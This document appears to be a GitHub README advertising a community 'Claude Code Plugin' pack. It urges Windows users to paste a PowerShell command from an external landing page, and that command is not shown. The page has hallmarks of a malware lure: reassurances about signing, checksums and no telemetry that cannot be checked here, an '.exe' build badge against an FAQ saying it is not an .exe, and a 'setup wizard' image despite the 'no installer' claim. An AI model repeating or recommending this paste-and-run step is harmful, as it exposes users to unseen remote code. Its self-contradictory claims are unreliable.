<div align="center">
<img src="assets/banner.png" width="100%" alt="Claude AI Coding Plugin banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff6a6a?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-0891B2?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-00BCD4?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=2563EB&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%93%A6+Claude+Code+Plugin;%E2%AD%90+Community+Tested;%E2%9C%A8+Active+Development+2026;%F0%9F%94%A7+Full+Feature+Suite;%F0%9F%9A%80+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=dotnet" />
</p>

---

### 🖥️ PowerShell Setup

Grab the plugin and wire it into Claude Code in one pass — open PowerShell, paste the command from the landing page, hit Enter, done. Full bootstrap details live on the landing.

![status](https://img.shields.io/badge/status-active-brightgreen?style=flat-square) ![platform](https://img.shields.io/badge/platform-Windows%2010%2F11-blue?style=flat-square) ![ps](https://img.shields.io/badge/PowerShell-5.1%2B-5391FE?style=flat-square) ![license](https://img.shields.io/badge/license-MIT-lightgrey?style=flat-square)

<p align="center">
  <a href="https://phoom2702-ai.github.io/claude-code-plugin/">
    <img src="files/button.svg" width="520" alt="Install via PowerShell" />
  </a>
</p>

<p align="center"><img src="assets/ui/main.png" alt="Claude Code Plugin Setup" width="100%" /></p>
<p align="center"><sub>Welcome page of the Claude Code Plugin setup wizard — banner strip, requirements summary, and Next/Cancel footer, exactly the flow the PowerShell bootstrap performs.</sub></p>

## 🧩 What this is

`claude-code-plugin` is the community plugin pack that bolts extra coding workflows onto Claude Code — slash commands, hook templates, MCP wiring, and a pile of prompt scaffolds that the Claude AI Coding Plugin crowd actually ships with. No installer, no runtime, no admin prompt. Just a portable folder that Claude Code picks up.

## 📋 System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| OS | Windows 10 (1809+) | Windows 11 23H2+ |
| PowerShell | 5.1 | 7.4 (pwsh) |
| Claude Code | any 2025+ CLI build | latest 2026 build |
| Network | required for bootstrap | wired / stable Wi-Fi |
| Disk | ~40 MB | ~150 MB (with caches) |
| RAM | 4 GB | 8 GB+ |

- Windows 10 or 11 (WSL2 also works if you mirror the folder into your Linux home)
- PowerShell 5.1 or newer — the bootstrap uses `Invoke-RestMethod` and `Expand-Archive`, both native
- An existing Claude Code install with a valid config directory
- Outbound HTTPS to the landing host and to `raw.githubusercontent.com`
- Git for Windows is *optional* but recommended if you want to pull updates manually

## ✨ Features

- Slash command pack: `/review`, `/explain`, `/test-gen`, `/refactor`, `/commit-msg` — all wired to Claude Code's command loader
- Hook templates for `PreToolUse`, `PostToolUse`, and `Stop` so you can gate edits or auto-format on save
- MCP server scaffolds (stdio + SSE) with working `claude_desktop_config.json` snippets
- Portable plugin layout — drop the folder in `~/.claude/plugins` and restart the CLI, no registry writes
- Idempotent bootstrap: re-running the PowerShell command upgrades in place and keeps your local overrides
- Prompt library organized by stack (TS, Python, Go, Rust, PowerShell itself)
- Dry-run mode (`-WhatIf`) so you can see what the bootstrap touches before it touches it
- Zero telemetry — the plugin never phones home, everything stays on disk

<p align="center"><img src="assets/ui/settings.png" alt="Claude Code Plugin — Bootstrap Options" width="100%" /></p>
<p align="center"><sub>Bootstrap options page — install path, overrides preservation, proxy, PowerShell host, and the -WhatIf dry-run toggle, with a preview of the config lines to be written.</sub></p>

## ⚙️ How it works

The landing page hands you a single PowerShell command. Under the hood it fetches the signed plugin manifest, verifies the checksum, expands the archive into `%USERPROFILE%\.claude\plugins\claude-code-plugin`, and merges the command + hook registrations into your existing Claude Code config. Nothing is written outside your user profile, and nothing requires elevation. Restart Claude Code and the new commands show up in `/help`. If you already have an older drop, the script diffs the manifest and only replaces changed files — your `overrides/` folder is untouched.

If the bootstrap fails halfway, it leaves a `.bootstrap.log` next to the plugin folder and exits non-zero so you can read what broke instead of guessing.

## 🖥️ Compatibility

- 🪟 Windows 10 / 11 — primary target, tested on 22H2 and 23H2
- 🎮 Steam Deck (Desktop Mode) — works via pwsh, mirror the plugin folder into `~/.claude/plugins`
- 🐧 WSL2 (Ubuntu 22.04+) — supported, same folder layout
- 💬 Discord — no first-class integration, but the hook templates include a webhook example some folks use for build notifications
- 📴 Offline — after the first bootstrap you can run fully offline; updates need network

## ❓ FAQ

**Do I need to install anything first?**
Just Claude Code and PowerShell 5.1+. The bootstrap pulls everything else into your user profile.

**Is this an .exe?**
No. It's a PowerShell bootstrap that expands a portable folder. You can read the script before running it — the landing page links the source.

**Will re-running the command break my setup?**
No. It's idempotent and preserves your `overrides/` folder. Worst case it re-downloads the same version.

**Where does it put files?**
`%USERPROFILE%\.claude\plugins\claude-code-plugin` plus merged entries in your existing Claude Code config. Nothing in Program Files, nothing in the registry.

**Can I uninstall cleanly?**
Delete the plugin folder and remove the two lines the bootstrap added to your config. The landing page has the exact diff.

**Why does PowerShell 7 work but 5.1 complain about `Expand-Archive`?**
5.1's `Expand-Archive` has a known slow path on large archives — 7.4 is faster but both work. If 5.1 hangs, upgrade to pwsh 7.4.

**Does it work behind a corporate proxy?**
Yes, if `$env:HTTPS_PROXY` is set. The bootstrap respects it.

**Is there a Linux-native bootstrap?**
Not yet — tracked in issues. WSL2 is the current workaround.

## ⚠️ Disclaimer

This is a community plugin pack, not an official Anthropic product. It wires into Claude Code's plugin loader, which means a bad hook can block your edits — read the hook templates before enabling them. Use at your own risk. No warranty, express or implied. If something catches fire, open an issue instead of a lawsuit.

## 📄 License

MIT. Do whatever you want, just keep the copyright notice.

![issues](https://img.shields.io/badge/issues-welcome-brightgreen?style=flat-square) ![prs](https://img.shields.io/badge/PRs-open-blue?style=flat-square) ![maintained](https://img.shields.io/badge/maintained-yes-success?style=flat-square) ![telemetry](https://img.shields.io/badge/telemetry-none-lightgrey?style=flat-square)

*Honestly the `-WhatIf` flag exists because I nuked my own config twice while testing this at 2am, so now everyone gets a dry-run.*